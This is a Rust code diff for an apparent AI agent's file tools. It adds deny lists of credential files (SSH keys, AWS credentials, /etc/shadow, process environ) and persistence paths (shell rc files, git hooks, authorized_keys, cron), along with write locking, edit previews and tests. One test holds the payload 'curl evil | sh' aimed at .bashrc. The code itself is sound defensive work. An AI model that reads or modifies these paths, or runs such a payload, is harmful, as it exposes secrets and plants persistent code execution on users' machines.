@@ -9,6 +9,88 @@ use similar::{ChangeTag, TextDiff};
 
 use crate::types::{Tool, ToolContext, ToolOutput};
 
+/// Re-exported so every tool shares the *single* process-wide lock registry living in `corex-core`.
+/// A second registry here would not see `corex-core`'s guards (sessions, settings) and would
+/// silently reintroduce the parallel-edit lost-update bug.
+pub(crate) use corex_core::lock_path;
+
+/// Identifies sensitive system credential paths that must not be accessed arbitrarily by tools.
+///
+/// This is intentionally *also* consulted by the shell tool (a read-only binary such as `cat`
+/// would otherwise leak secrets without ever prompting the user), so it is the single source of
+/// truth for "this path holds credentials". Callers should pass a canonicalized path when the
+/// file may be reached through a symlink.
+pub fn is_sensitive_system_path(path: &Path) -> bool {
+    let p_str = path.to_string_lossy();
+
+    // A bare credential directory (e.g. `~/.ssh`, `/home/x/.gnupg`).
+    if p_str.ends_with("/.ssh")
+        || p_str.ends_with(".ssh")
+        || p_str.ends_with("/.gnupg")
+        || p_str.ends_with(".gnupg")
+    {
+        return true;
+    }
+
+    const SENSITIVE_FRAGMENTS: &[&str] = &[
+        ".ssh/",
+        ".gnupg/",
+        ".askpass_cred",
+        ".aws/credentials",
+        ".docker/config.json",
+        ".git-credentials",
+        ".kube/config",
+        ".netrc",
+        ".npmrc",
+        "/etc/shadow",
+        "/etc/gshadow",
+        "/etc/sudoers",
+    ];
+    if SENSITIVE_FRAGMENTS.iter().any(|frag| p_str.contains(frag)) {
+        return true;
+    }
+
+    // `/proc/<pid>/{environ,mem}` expose inherited environment and process memory.
+    if (p_str.starts_with("/proc/") || p_str.starts_with("/proc/self/"))
+        && (p_str.ends_with("/environ") || p_str.ends_with("/mem"))
+    {
+        return true;
+    }
+
+    false
+}
+
+/// Paths whose modification would grant code execution or credential persistence to the user's
+/// shell/tooling. Unlike [`is_sensitive_system_path`], these are *refused outright* — even in
+/// YOLO mode — because writing them turns a normal file edit into persistent code execution.
+pub fn is_protected_write_path(path: &Path) -> bool {
+    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
+        const PROTECTED_NAMES: &[&str] = &[
+            ".bashrc",
+            ".bash_profile",
+            ".bash_login",
+            ".profile",
+            ".zshrc",
+            ".zprofile",
+            ".zshenv",
+            ".gitconfig",
+            ".git-credentials",
+        ];
+        if PROTECTED_NAMES.contains(&name) {
+            return true;
+        }
+    }
+
+    let p_str = path.to_string_lossy();
+    p_str.contains("/.git/hooks/")
+        || p_str.ends_with("/.ssh/authorized_keys")
+        || p_str.contains("/authorized_keys")
+        || p_str.contains("/.config/fish/config.fish")
+        || p_str.contains("/etc/profile.d/")
+        || p_str.contains("/etc/cron.d/")
+        || p_str.contains("/etc/crontab")
+}
+
 /// Resolves a file path: expands `~/` to the user home directory,
 /// preserves absolute paths, and joins relative paths with the workspace directory.
 pub fn resolve_path(workspace: &Path, rel: &str) -> PathBuf {
@@ -39,7 +121,11 @@ pub fn is_binary_file(path: &Path) -> bool {
 /// Writes content to a file atomically via a temporary file in the same directory,
 /// preventing corruption if the process is interrupted.
 pub fn atomic_write(path: &Path, content: &str) -> std::io::Result<()> {
-    if let Some(parent) = path.parent() {
+    let target_path = match path.canonicalize() {
+        Ok(canonical) => canonical,
+        Err(_) => path.to_path_buf(),
+    };
+    if let Some(parent) = target_path.parent() {
         fs::create_dir_all(parent)?;
     }
     let pid = std::process::id();
@@ -47,9 +133,9 @@ pub fn atomic_write(path: &Path, content: &str) -> std::io::Result<()> {
         .duration_since(std::time::UNIX_EPOCH)
         .map(|d| d.as_nanos())
         .unwrap_or(0);
-    let tmp_path = path.with_extension(format!("tmp.{}.{}", pid, ts));
+    let tmp_path = target_path.with_extension(format!("tmp.{}.{}", pid, ts));
     fs::write(&tmp_path, content)?;
-    fs::rename(&tmp_path, path)
+    fs::rename(&tmp_path, &target_path)
 }
 
 /// Formats byte counts into clean human-readable representations.
@@ -105,6 +191,12 @@ impl Tool for ReadFileTool {
         };
 
         let path = resolve_path(&context.workspace_dir, rel_path);
+        if is_sensitive_system_path(&path) {
+            return Ok(ToolOutput::error(format!(
+                "Access denied: reading sensitive credential or authentication file '{}' is forbidden.",
+                rel_path
+            )));
+        }
         if !path.exists() {
             return Ok(ToolOutput::error(format!("File does not exist: {}", rel_path)));
         }
@@ -116,11 +208,20 @@ impl Tool for ReadFileTool {
             )));
         }
 
+        let metadata = fs::metadata(&path).ok();
+        let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);
+
         if is_binary_file(&path) {
-            let metadata = fs::metadata(&path).ok();
-            let size = metadata.map(|m| m.len()).unwrap_or(0);
             return Ok(ToolOutput::success(format!(
                 "[Binary file: {} ({}). Cannot display content as plain text]",
+                rel_path,
+                format_size(size)
+            )));
+        }
+
+        if size > 10 * 1024 * 1024 {
+            return Ok(ToolOutput::error(format!(
+                "File '{}' is too large ({}). Maximum read limit is 10 MB to prevent memory exhaustion. Use 'run_shell_command' with head/tail or grep instead.",
                 rel_path,
                 format_size(size)
             )));
@@ -145,11 +246,24 @@ impl Tool for ReadFileTool {
             (None, None) => default_limit.min(total_lines),
         };
 
-        if s >= total_lines && total_lines > 0 {
+        if total_lines == 0 {
+            return Ok(ToolOutput::success("(Empty file)".to_string()));
+        }
+
+        if s >= total_lines {
             return Ok(ToolOutput::error(format!(
                 "Start line {} exceeds total lines {} in {}",
                 s + 1,
                 total_lines,
+                rel_path
+            )));
+        }
+
+        if s > e {
+            return Ok(ToolOutput::error(format!(
+                "Invalid line range: start_line ({}) cannot be greater than end_line ({}) in {}",
+                s + 1,
+                e,
                 rel_path
             )));
         }
@@ -208,8 +322,14 @@ impl Tool for WriteFileTool {
         })
     }
 
-    fn needs_confirmation(&self, _args: &serde_json::Value, _context: &ToolContext) -> bool {
-        true
+    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
+        if let Some(rel) = args.get("file_path").and_then(|v| v.as_str()) {
+            let path = resolve_path(&context.workspace_dir, rel);
+            if !path.starts_with(&context.workspace_dir) {
+                return true;
+            }
+        }
+        !context.allowed_commands.iter().any(|cmd| cmd == "write_file")
     }
 
     fn format_diff(&self, args: &serde_json::Value, workspace: &Path) -> Option<String> {
@@ -243,6 +363,23 @@ impl Tool for WriteFileTool {
         };
 
         let path = resolve_path(&context.workspace_dir, rel_path);
+        if is_sensitive_system_path(&path) {
+            return Ok(ToolOutput::error(format!(
+                "Access denied: writing to sensitive credential or authentication file '{}' is forbidden.",
+                rel_path
+            )));
+        }
+        if is_protected_write_path(&path) {
+            return Ok(ToolOutput::error(format!(
+                "Refusing to write to protected path '{}': shell startup files, git hooks and cron \
+                 entries can execute arbitrary code. Edit it manually if this is intentional.",
+                rel_path
+            )));
+        }
+
+        // Serialize writes to this path so parallel batches cannot interleave their writes.
+        let _guard = lock_path(&path).await;
+
         let existed = path.exists();
         let old_size = if existed {
             fs::metadata(&path).map(|m| m.len()).unwrap_or(0)
@@ -284,22 +421,63 @@ impl Tool for WriteFileTool {
 
 pub struct EditTool;
 
-fn format_edit_preview(content: &str, start_line: usize, end_line: usize) -> String {
-    let lines: Vec<&str> = content.lines().collect();
-    let total = lines.len();
-    if total == 0 {
+/// Lines of untouched context kept around every change in an edit preview.
+const EDIT_PREVIEW_CONTEXT: usize = 3;
+
+/// Renders what an edit did as a diff, removals included.
+///
+/// Showing the resulting file alone hides half of the change: whatever the edit dropped never
+/// reaches the screen. Each row is `marker + line number + text`, where `-` is a line that left the
+/// file, `+` one that replaced it and a space an untouched line around them, numbered on the side
+/// it belongs to. Untouched stretches between distant changes are elided to keep it readable.
+fn format_edit_preview(old_content: &str, new_content: &str) -> String {
+    let diff = TextDiff::from_lines(old_content, new_content);
+
+    // First pass: which rows changed, and with them which untouched ones are worth showing.
+    let mut changed = Vec::new();
+    let mut total_rows = 0usize;
+    for (idx, change) in diff.iter_all_changes().enumerate() {
+        total_rows = idx + 1;
+        if change.tag() != ChangeTag::Equal {
+            changed.push(idx);
+        }
+    }
+    if changed.is_empty() {
         return String::new();
     }
-    let display_start = start_line.saturating_sub(3).max(1);
-    let display_end = (end_line + 3).min(total);
 
+    let mut keep = vec![false; total_rows];
+    for &idx in &changed {
+        let start = idx.saturating_sub(EDIT_PREVIEW_CONTEXT);
+        let end = idx.saturating_add(EDIT_PREVIEW_CONTEXT).min(total_rows - 1);
+        for slot in keep.iter_mut().take(end + 1).skip(start) {
+            *slot = true;
+        }
+    }
+
+    let first = changed[0].saturating_sub(EDIT_PREVIEW_CONTEXT);
+    let last = changed[changed.len() - 1].saturating_add(EDIT_PREVIEW_CONTEXT).min(total_rows - 1);
+
+    // Second pass: only the kept rows are materialised, so a large file costs nothing.
     let mut preview = String::new();
-    for idx in display_start..=display_end {
-        let line_num = idx;
-        let line_content = lines[idx - 1];
-        let is_modified = line_num >= start_line && line_num <= end_line;
-        let marker = if is_modified { ">" } else { " " };
-        preview.push_str(&format!("{}{:4} | {}\n", marker, line_num, line_content));
+    let mut previous: Option<usize> = None;
+    for (idx, change) in diff.iter_all_changes().enumerate() {
+        if idx < first || idx > last || !keep[idx] {
+            continue;
+        }
+        if let Some(previous) = previous {
+            if idx > previous + 1 {
+                preview.push_str(&format!("   ⋯ | {} lines not shown\n", idx - previous - 1));
+            }
+        }
+        let (marker, number) = match change.tag() {
+            ChangeTag::Delete => ('-', change.old_index().unwrap_or(0) + 1),
+            ChangeTag::Insert => ('+', change.new_index().unwrap_or(0) + 1),
+            ChangeTag::Equal => (' ', change.new_index().unwrap_or(0) + 1),
+        };
+        let text = change.value().trim_end_matches(['\n', '\r']);
+        preview.push_str(&format!("{}{:4} | {}\n", marker, number, text));
+        previous = Some(idx);
     }
     preview
 }
@@ -343,8 +521,14 @@ impl Tool for EditTool {
         })
     }
 
-    fn needs_confirmation(&self, _args: &serde_json::Value, _context: &ToolContext) -> bool {
-        true
+    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
+        if let Some(rel) = args.get("file_path").and_then(|v| v.as_str()) {
+            let path = resolve_path(&context.workspace_dir, rel);
+            if !path.starts_with(&context.workspace_dir) {
+                return true;
+            }
+        }
+        !context.allowed_commands.iter().any(|cmd| cmd == "edit_file")
     }
 
     fn format_diff(&self, args: &serde_json::Value, workspace: &Path) -> Option<String> {
@@ -380,6 +564,15 @@ impl Tool for EditTool {
             Some(s) => s,
             None => return Ok(ToolOutput::error("Missing 'old_string' argument.")),
         };
+        // An empty needle matches at every offset — and exactly once on an empty file — so it would
+        // silently prepend `new_string` at position 0 while reporting a successful replacement.
+        if old_string.is_empty() {
+            return Ok(ToolOutput::error(
+                "The 'old_string' argument cannot be empty: it matches everywhere and replaces \
+                 nothing meaningful. Provide the exact segment to replace, or use 'write_file' to \
+                 create or fully overwrite the file.",
+            ));
+        }
         let new_string = match args.get("new_string").and_then(|v| v.as_str()) {
             Some(s) => s,
             None => return Ok(ToolOutput::error("Missing 'new_string' argument.")),
@@ -387,9 +580,26 @@ impl Tool for EditTool {
         let allow_multiple = args.get("allow_multiple").and_then(|v| v.as_bool()).unwrap_or(false);
 
         let path = resolve_path(&context.workspace_dir, rel_path);
+        if is_sensitive_system_path(&path) {
+            return Ok(ToolOutput::error(format!(
+                "Access denied: editing sensitive credential or authentication file '{}' is forbidden.",
+                rel_path
+            )));
+        }
+        if is_protected_write_path(&path) {
+            return Ok(ToolOutput::error(format!(
+                "Refusing to edit protected path '{}': shell startup files, git hooks and cron \
+                 entries can execute arbitrary code. Edit it manually if this is intentional.",
+                rel_path
+            )));
+        }
         if !path.exists() {
             return Ok(ToolOutput::error(format!("File does not exist: {}", rel_path)));
         }
+
+        // Hold the per-path lock across the whole read-modify-write so a parallel batch cannot
+        // read the same original and clobber this edit.
+        let _guard = lock_path(&path).await;
 
         let content = match fs::read_to_string(&path) {
             Ok(c) => c,
@@ -513,11 +723,22 @@ impl Tool for EditTool {
             }
         };
 
+        // Compare-and-swap: refuse to clobber a file that changed under us (an external editor or
+        // another process may have written it between our read and this write).
+        if let Ok(current) = fs::read_to_string(&path) {
+            if current != content {
+                return Ok(ToolOutput::error(format!(
+                    "Refusing to edit {}: the file changed on disk after it was read. Re-read it and retry.",
+                    rel_path
+                )));
+            }
+        }
+
         if let Err(e) = atomic_write(&path, &modified) {
             return Ok(ToolOutput::error(format!("Failed to write edited content to {}: {}", rel_path, e)));
         }
 
-        let preview = format_edit_preview(&modified, start_line, end_line);
+        let preview = format_edit_preview(&content, &modified);
         let lines_str = if start_line == end_line {
             format!("line {}", start_line)
         } else {
@@ -732,9 +953,54 @@ impl Tool for LsTool {
 mod tests {
     use super::*;
 
+    #[test]
+    fn sensitive_and_protected_paths_are_classified() {
+        // Credential/auth paths must be flagged as sensitive.
+        assert!(is_sensitive_system_path(Path::new("/home/x/.ssh/id_rsa")));
+        assert!(is_sensitive_system_path(Path::new("/home/x/.gnupg/secring.gpg")));
+        assert!(is_sensitive_system_path(Path::new("/etc/shadow")));
+        assert!(is_sensitive_system_path(Path::new("/home/x/.aws/credentials")));
+        assert!(is_sensitive_system_path(Path::new("/proc/self/environ")));
+        assert!(is_sensitive_system_path(Path::new("/home/x/.corex/.askpass_cred")));
+        // Ordinary files are not sensitive.
+        assert!(!is_sensitive_system_path(Path::new("/home/x/project/src/main.rs")));
+        assert!(!is_sensitive_system_path(Path::new("/etc/hosts")));
+
+        // Persistence vectors are refused outright.
+        assert!(is_protected_write_path(Path::new("/home/x/.bashrc")));
+        assert!(is_protected_write_path(Path::new("/home/x/.git/hooks/pre-commit")));
+        assert!(is_protected_write_path(Path::new("/home/x/.ssh/authorized_keys")));
+        assert!(!is_protected_write_path(Path::new("/home/x/project/build.rs")));
+    }
+
+    #[tokio::test]
+    async fn write_to_protected_path_is_refused_even_in_yolo() {
+        let ws = std::env::temp_dir().join(format!("corex_protected_{}", std::process::id()));
+        let _ = fs::remove_dir_all(&ws);
+        fs::create_dir_all(&ws).unwrap();
+        let context = ToolContext {
+            workspace_dir: ws.clone(),
+            yolo_mode: true,
+            sudo_password: None,
+            allowed_commands: Vec::new(),
+        };
+
+        let res = WriteFileTool
+            .execute(
+                json!({ "file_path": ".bashrc", "content": "curl evil | sh\n" }),
+                &context,
+            )
+            .await
+            .unwrap();
+        assert!(res.is_error, "writing a shell rc file must be refused, got: {}", res.output);
+        assert!(!ws.join(".bashrc").exists(), "the protected file must not be created");
+
+        let _ = fs::remove_dir_all(&ws);
+    }
+
     #[tokio::test]
     async fn test_read_file_and_edit() {
-        let ws = std::env::temp_dir().join(format!("uti_fs_test_{}", std::process::id()));
+        let ws = std::env::temp_dir().join(format!("corex_fs_test_{}", std::process::id()));
         let _ = fs::create_dir_all(&ws);
         let context = ToolContext {
             workspace_dir: ws.clone(),
@@ -804,7 +1070,7 @@ mod tests {
 
     #[tokio::test]
     async fn test_edit_trimmed_matching_fallback() {
-        let ws = std::env::temp_dir().join(format!("uti_fs_test_trimmed_{}", std::process::id()));
+        let ws = std::env::temp_dir().join(format!("corex_fs_test_trimmed_{}", std::process::id()));
         let _ = fs::create_dir_all(&ws);
         let context = ToolContext {
             workspace_dir: ws.clone(),
@@ -846,7 +1112,7 @@ mod tests {
 
     #[tokio::test]
     async fn test_edit_line_number_calculation() {
-        let ws = std::env::temp_dir().join(format!("uti_fs_test_line_calc_{}", std::process::id()));
+        let ws = std::env::temp_dir().join(format!("corex_fs_test_line_calc_{}", std::process::id()));
         let _ = fs::create_dir_all(&ws);
         let context = ToolContext {
             workspace_dir: ws.clone(),
@@ -883,7 +1149,8 @@ mod tests {
 
         assert!(!res.is_error);
         assert!(res.output.contains("(line 8):"), "Output should contain '(line 8):', got: {}", res.output);
-        assert!(res.output.contains(">   8 | line 8 modified"), "Output should highlight line 8, got: {}", res.output);
+        assert!(res.output.contains("+   8 | line 8 modified"), "Output should show line 8 as added, got: {}", res.output);
+        assert!(res.output.contains("-   8 | line 8\n"), "Output should keep the line the edit replaced, got: {}", res.output);
 
         let diff = editor.format_diff(
             &json!({
@@ -896,6 +1163,189 @@ mod tests {
         assert!(diff.contains("@@"), "Diff should contain hunk header @@, got: {}", diff);
         assert!(diff.contains("-line 8 modified"));
         assert!(diff.contains("+line 8 diff"));
+
+        let _ = fs::remove_dir_all(&ws);
+    }
+
+    #[tokio::test]
+    async fn test_read_file_inverted_range_and_empty_safe() {
+        let ws = std::env::temp_dir().join(format!("corex_rf_test_{}", std::process::id()));
+        let _ = fs::create_dir_all(&ws);
+        let test_file = ws.join("sample.txt");
+        fs::write(&test_file, "line 1\nline 2\nline 3\nline 4\nline 5\n").unwrap();
+
+        let context = ToolContext {
+            workspace_dir: ws.clone(),
+            yolo_mode: true,
+            sudo_password: None,
+            allowed_commands: Vec::new(),
+        };
+
+        let reader = ReadFileTool;
+
+        // Inverted range must return an error and NOT panic
+        let res = reader.execute(
+            json!({
+                "file_path": "sample.txt",
+                "start_line": 5,
+                "end_line": 2
+            }),
+            &context,
+        ).await.unwrap();
+        assert!(res.is_error);
+        assert!(res.output.contains("Invalid line range"));
+
+        // Empty file must not panic with start_line > 1
+        let empty_file = ws.join("empty.txt");
+        fs::write(&empty_file, "").unwrap();
+        let res_empty = reader.execute(
+            json!({
+                "file_path": "empty.txt",
+                "start_line": 2
+            }),
+            &context,
+        ).await.unwrap();
+        assert!(!res_empty.is_error);
+        assert_eq!(res_empty.output, "(Empty file)");
+
+        let _ = fs::remove_dir_all(&ws);
+    }
+
+    #[test]
+    fn test_edit_preview_keeps_the_lines_the_edit_removed() {
+        let preview = format_edit_preview("a\nb\nc\nd\ne\n", "a\nB\nc\nd\ne\n");
+
+        assert!(preview.contains("-   2 | b\n"), "the replaced line must be shown, got: {}", preview);
+        assert!(preview.contains("+   2 | B\n"), "the new line must be shown, got: {}", preview);
+        assert!(preview.contains("    1 | a\n"), "surrounding context keeps its own numbering, got: {}", preview);
+    }
+
+    #[test]
+    fn test_edit_preview_elides_the_untouched_middle_of_a_long_file() {
+        let old: String = (1..=40).map(|i| format!("line {}\n", i)).collect();
+        let new = old.replace("line 2\n", "line 2 changed\n").replace("line 38\n", "line 38 changed\n");
+
+        let preview = format_edit_preview(&old, &new);
+
+        assert!(preview.contains("-   2 | line 2\n"), "got: {}", preview);
+        assert!(preview.contains("+  38 | line 38 changed\n"), "both far-apart changes must survive, got: {}", preview);
+        assert!(preview.contains("lines not shown"), "the untouched middle must be elided, got: {}", preview);
+        assert!(!preview.contains("line 20\n"), "elided lines cannot reach the preview, got: {}", preview);
+    }
+
+    /// Eight edits to the same file launched concurrently: every single one must land.
+    ///
+    /// Before the per-path lock this was a lost update — each task read the same original, the last
+    /// `rename` won, and the other seven edits vanished while every call still returned success.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+    async fn concurrent_edits_to_the_same_file_all_land() {
+        let ws = std::env::temp_dir().join(format!("corex_concurrent_edit_{}", std::process::id()));
+        let _ = fs::remove_dir_all(&ws);
+        fs::create_dir_all(&ws).unwrap();
+
+        let original: String = (1..=8).map(|i| format!("line {}\n", i)).collect();
+        fs::write(ws.join("sample.txt"), &original).unwrap();
+
+        let context = ToolContext {
+            workspace_dir: ws.clone(),
+            yolo_mode: true,
+            sudo_password: None,
+            allowed_commands: Vec::new(),
+        };
+
+        let mut handles = Vec::new();
+        for i in 1..=8 {
+            let ctx = context.clone();
+            handles.push(tokio::spawn(async move {
+                EditTool
+                    .execute(
+                        json!({
+                            "file_path": "sample.txt",
+                            "old_string": format!("line {}\n", i),
+                            "new_string": format!("LINE {}\n", i),
+                        }),
+                        &ctx,
+                    )
+                    .await
+                    .unwrap()
+            }));
+        }
+
+        for handle in handles {
+            let res = handle.await.unwrap();
+            assert!(!res.is_error, "every edit must succeed, got: {}", res.output);
+        }
+
+        let final_content = fs::read_to_string(ws.join("sample.txt")).unwrap();
+        let expected: String = (1..=8).map(|i| format!("LINE {}\n", i)).collect();
+        assert_eq!(final_content, expected, "every concurrent edit must survive");
+
+        let _ = fs::remove_dir_all(&ws);
+    }
+
+    /// An empty needle matches at every offset, so accepting it would report a successful
+    /// replacement while silently inserting at position 0. It must be rejected and change nothing.
+    #[tokio::test]
+    async fn edit_rejects_an_empty_old_string() {
+        let ws = std::env::temp_dir().join(format!("corex_empty_old_{}", std::process::id()));
+        let _ = fs::remove_dir_all(&ws);
+        fs::create_dir_all(&ws).unwrap();
+        fs::write(ws.join("sample.txt"), "keep me\n").unwrap();
+
+        let context = ToolContext {
+            workspace_dir: ws.clone(),
+            yolo_mode: true,
+            sudo_password: None,
+            allowed_commands: Vec::new(),
+        };
+
+        let res = EditTool
+            .execute(
+                json!({ "file_path": "sample.txt", "old_string": "", "new_string": "injected\n" }),
+                &context,
+            )
+            .await
+            .unwrap();
+
+        assert!(res.is_error, "an empty old_string must be rejected, got: {}", res.output);
+        assert_eq!(
+            fs::read_to_string(ws.join("sample.txt")).unwrap(),
+            "keep me\n",
+            "the file must be left untouched"
+        );
+
+        let _ = fs::remove_dir_all(&ws);
+    }
+
+    /// The lock must really exclude: a second holder cannot proceed while the first holds it.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn lock_path_serializes_concurrent_holders() {
+        use std::sync::atomic::{AtomicBool, Ordering};
+
+        let ws = std::env::temp_dir().join(format!("corex_lock_test_{}", std::process::id()));
+        let _ = fs::create_dir_all(&ws);
+        let target = ws.join("target.txt");
+        fs::write(&target, "x").unwrap();
+
+        let guard = lock_path(&target).await;
+
+        let acquired = std::sync::Arc::new(AtomicBool::new(false));
+        let flag = acquired.clone();
+        let path = target.clone();
+        let waiter = tokio::spawn(async move {
+            let _guard = lock_path(&path).await;
+            flag.store(true, Ordering::SeqCst);
+        });
+
+        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
+        assert!(
+            !acquired.load(Ordering::SeqCst),
+            "a second lock_path must block while the first guard is alive"
+        );
+
+        drop(guard);
+        waiter.await.unwrap();
+        assert!(acquired.load(Ordering::SeqCst));
 
         let _ = fs::remove_dir_all(&ws);
     }
